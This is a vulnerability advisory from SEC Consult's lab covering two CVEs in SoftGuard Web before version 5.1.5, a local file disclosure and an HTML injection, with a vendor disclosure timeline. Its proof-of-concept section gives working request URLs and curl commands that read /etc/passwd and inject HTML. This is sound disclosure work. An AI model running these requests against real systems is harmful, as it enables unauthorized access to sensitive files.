=== Content from sec-consult.com_fd1a62b4_20250115_090548.html ===

Toggle Navbar

* [Career](/career/)
* [About us](/about-us/)
* [Contact](/contact/)

* EN
  + [DE](/de/vulnerability-lab/advisory/softguard-mehrere-schwachstellen/ "German")
Search

* Compliance & Regulations
  + [NIS2](/compliance-regulations/nis2/)
  + [Digital Operational Resilience Act (DORA)](/compliance-regulations/dora/)
* Security Testing
  + [Web Application Security](/security-testing/web-application-security/)
  + [Penetration Testing](/security-testing/penetration-testing/)
  + [Mobile Security](/security-testing/mobile-security/)
  + [Cloud Security](/security-testing/cloud-security/)
  + [IT Infrastructure Security](/security-testing/it-infrastructure-security/)
  + [Security for SAP Services](/security-testing/security-for-sap-services/)
  + [IoT and Embedded Systems Security](/security-testing/iot-and-embedded-systems-security/)
  + [Red Teaming](/security-testing/red-teaming/)
* Processes & Organisation
  + [Information Security Management (ISM)](/processes-organisation/information-security-management-ism/)
  + [OT Security](/processes-organisation/ot-security/)
  + [Secure Software Development Consulting](/processes-organisation/secure-software-development/)
  + [Red Teaming](/security-testing/red-teaming/)
  + [SEC Trainings](/processes-organisation/sec-trainings/)
  + [Project- und Program Management](/processes-organisation/project-und-program-management/)
* Incident Response
  + [SEC Defence](/incident-response/sec-defence/)
* [Vulnerability Lab](/vulnerability-lab/)
* [Blog](/blog/)
 [Incident?
Breached?
Report an incident](/incident-response/sec-defence/)

1. [Home](/)
2. [Vulnerability Lab](/vulnerability-lab/)
3. Multiple vulnerabilities in SoftGuard SNMP Network Management Extension
# Multiple vulnerabilities in SoftGuard SNMP Network Management Extension

Title

Multiple vulnerabilities

Product

SoftGuard - A network management extension

Vulnerable Version

SoftGuard Web (SGW) < 5.1.5

Fixed Version

SoftGuard version 5.1.5 from 2022-06-01

CVE Number

CVE-2022-31201, CVE-2022-31202

Impact

high

Homepage

[https://gravitate.eu (reseller)](https://gravitate.eu "https://gravitate.eu (reseller)")

Found

14.04.2022

By

Philipp Espernberger (Office Linz) | SEC Consult Vulnerability Lab

A local file disclosure was found in the 'export' and 'man' functionality of SoftGuard. These functionalities are vulnerable because of insufficient input validation and arbitrary local files can be disclosed. Files that include passwords and other sensitive information can be accessed with current application privileges. Furthermore, an attacker can include arbitrary HTML into the affected web page. The code is executed in the context of the victim's browser when visiting the manipulated URL. The vulnerability can be used to change the contents of the displayed site or redirect to other sites.

## Vendor description

There is no public description available for this vendor/product. The following description was provided as documentation:

"*SoftGuard is a network management extension which collects inventory-, analysis- and debugging data of devices and networks at least once a day. SoftGuard has an open structure, is built simple, is easily expandable, easy to use and is laid out for large scale networks. The data collection is performed with the protocols SNMP supporting the versions 1, 2c and 3. Additional protocols like ssh, telnet, rsh, https, NetBIOS/IP, ICMP ... complemented by SNMP if required.*

*The SoftGuard Suite consists of three parts:*

* *SoftGuard Network Center (SNC)*
* *SoftGuard Host Center (SHC)*
* *SoftGuard Monitor Center (SMC)*

*Aditionally there are a bunch of common and customer specific expansions like SoftGuard Web (SGW), SoftGuard Statistic Tool (SST), Port Configuration Tool (PCT), Network Access Points (NAP), Technician Access Point (TAP), etc."*

## Business recommendation

SEC Consult recommends to update to the latest version of SoftGuard (network management extension). An in-depth security analysis performed by security professionals is highly advised, to identify and resolve potential further critical security issues.

## Vulnerability overview/description

### 1) File System Access (CVE-2022-31202)

The export function allows authenticated attackers to download any arbitrary local file from the file system due to insufficient input  validation. The unfiltered URL parameter query enables an attacker to access arbitrary local files. This allows the attacker to define the complete path and the filename by himself. Files that include passwords and other sensitive information can be accessed. Furthermore, the built-in man functionality also allows attackers to read any arbitrary local file from the file system.

### 2) HTML Injection (CVE-2022-31201)

Various components do not properly sanitize/encode user input. This leads to HTML injection vulnerabilities. By exploiting this vulnerability, an attacker can include arbitrary HTML into the affected web page. The code is executed in the context of the victim's browser when visiting the manipulated URL. The vulnerability can be used to change the contents of the displayed site or redirect to other sites.

During the security assessment it was not possible to execute JavaScript code because the security headers Content-Security-Policy and X-Content-Type-Options are preventing the execution.

## Proof of concept

### 1) File System Access (CVE-2022-31202)

#### 1a) Export functionality

In order to access arbitrary local files, the export function as authenticated  user (Administration -> User -> Access -> Export) can be used. The following URL was used to set the filename to /etc/passwd

```
https ://$host:8016/sgw/export?dbs=file&db=DefUser_access_$username_db%2e
1649426888398872%2etmp&query=file%3a/etc/passwd'
```

The newly set filename (/etc/passwd) can be exported and downloaded via the execution button. Afterwards the content of the file gets downloaded successfully.

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
[...]
```
#### 1b) MAN functionality

The following curl command shows how an authenticated attacker can gain access to any arbitrary local file:

```
curl 'https://$host:8016/cgi-bin/man.tcl' -H 'Authorization: Basic [...]'
--data 'act=1&x=%2Fetc%2Fpasswd&submit=Execute' --compressed --insecure
```

The curl response includes the contents of the file:

```
<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8" />
[...]
<pre>
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
[...]
```
### 2) HTML Injection (CVE-2022-31201)

When a new graph is created an authenticated attacker controls the GET parameters  and can inject malicious content. The following curl command shows how an authenticated attacker can inject HTML code:

```
curl 'https://$host:8016/sgw/graph?tbl=sgNode&t=percent&h=Status%3Ch1%3ESEC-
Consult%3C/h1%3E+%23&v=%7bdown+1934+orange%7d+%7bicmp+555+red%7d+%7bsnmpaaaa+8723+green%7d&scale=5'
-H 'Authorization: Basic [...]' --compressed --insecure
```

The curl response includes the injected HTML code <h1>SEC Consult</h1>:

```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<title>SGW - Graph: Node</title>
[...]
</head>
<body class="master">
[...]
<caption>∑3, Status<h1>SEC Consult</h1>, #11212</caption>
[...]
<tr><td>Status<h1>SEC Consult</h1></td>
[...]
</body></html>
```
## Vulnerable / tested versions

The following version has been tested and found to be vulnerable:

* SoftGuard Web (SGW) 5.1.3

The vendor provided the following information regarding the affected versions:

1a) affected version 4.5.0 (2019-05-04) to version 4.5.8 (2020-05-05)

1b) since SoftGuard 2.0 with SoftGuard Web 1.0 (~1998/99)

2)  since SoftGuard 3.6.0 (2009-10-31) / SoftGuard 3.6.6 (2011-02-15) with SoftGuard Web 2.6.0/2.6.6

## Vendor contact timeline

| 2022-05-11 | Contacting vendor through direct email address. |
| --- | --- |
| 2022-05-11 | Sent encrypted security advisory to vendor |
| 2022-05-12 | Received feedback from the vendor for the security advisory |
| 2022-05-16 | Received confirmation that a new version of SoftGuard was already rolled out to the customers which included the fix |
| 2022-05-16 | Received additional information which versions are vulnerable |
| 2022-05-19 | Received CVE numbers. |
| 2022-05-20 | Reviewed the fixed version 5.1.4 and found that HTML injection still works at other endpoints, other issues are fixed. |
| 2022-05-20 | Vendor replies that new version 5.1.5. will be released on 1st June. |
| 2022-06-01 | Vendor releases patched version 5.1.5. |
| 2022-06-09 | Release of security advisory. |

### Solution

The vendor rolled out new software versions. Affected users should verify that they are using the latest version available (5.1.5 from 2022-06-01 or higher).

### Workaround

None

### Advisory URL

<https://sec-consult.com/vulnerability-lab/>

EOF P. Espernberger / @2022

*Interested to work with the experts of SEC Consult?*

*Send us your [application](https://sec-consult.com/career/)*

*Interested in improving your cyber security with the experts of SEC Consult?*

*Contact our [local offices](https://sec-consult.com/contact/)*

[Back](/vulnerability-lab/)

* [Legal Notice](/legalnotice/)
* [Privacy Statement](/privacy-statement/)
* [Jobs](/career/)

SEC Consult is one of the leading consultancies in the field of cyber and [application security](/security-testing/web-application-security/ "Web Application Security"). The company specializes in [information security management](/processes-organisation/information-security-management-ism/ "Information Security Management (ISM)"), NIS security audits, [penetration testing](/security-testing/penetration-testing/ "Pentesting (Pentest)"), ISO 27001 certification support, [Cyber Defence](/incident-response/sec-defence/ "Cyber Defence") and [secure software certification](/processes-organisation/secure-software-development/ "Secure Software Development Consulting"). SEC Consult is part of [Eviden](https://eviden.com/ "Link to Eviden website").

[![bsi ISO/IEC 27001 Information Security Management CERTIFIED](/typo3temp/assets/_processed_/c/2/csm_bsi_9a24e74563.png)](/about-us/ "About us")[![ISO 27001 CREST certified](/typo3temp/assets/_processed_/0/6/csm_crest_0eb9c5864d.png)](/about-us/ "About us")[![Great Place To Work AT certified](/typo3temp/assets/_processed_/0/3/csm_great-place-to-work-at_773b265aa6.png)](/about-us/ "About us")[![Great Place To Work DE certified](/typo3temp/assets/_processed_/d/6/csm_great-place-to-work-de_2fcb537270.png)](/about-us/ "About us")

## We use Cookies

We use cookies to offer you a perfect visit experience. These include cookies that are necessary for the operation of the site and for the control of our commercial corporate goals, as well as those that are only used for anonymous statistical purposes, for convenience settings or to display personalized content. Decide for yourself which categories you want to allow. Please note that based on your settings, not all functions of the site may be available.

**[Legal Notice](/legalnotice/)** •  **[Privacy Statement](/privacy-statement/)**

### Technically required

(
0
Service
)

no

Technically required (
0
Service
)

yes

### Analysis / statistics

(
1
Service
)

Anonymous evaluation for troubleshooting and further development

no

Analysis / statistics (
1
Service
)

yes

#### Matomo

no

Matomo

yes

Matomo.org
Show details

Hide details

**Purpose**: Error analysis, statistical evaluation of our website accesses, campaign analysis, conversion tracking.
 **Processing operations**: collection of access data, data from your browser and data about the content accessed; execution of analysis software and storage of data on your terminal device, anonymization of the data collected; evaluation of the anonymous data in the form of statistics.
 **Storage period**: 1 year.
 **Joint controller**: LimeSoda Interactive Marketing GmbH.
 **Legal basis for data processing**: Art. 6 para. 1 lit. f of the DSGVO.
 **Consequences of non-consent**: This basic tracking is absolutely necessary for the operation of our website.
 **Data transfer**: The data collected with Matomo is stored on our own servers. It is not passed on to third parties.

Accept selected

Reject all

Accept all


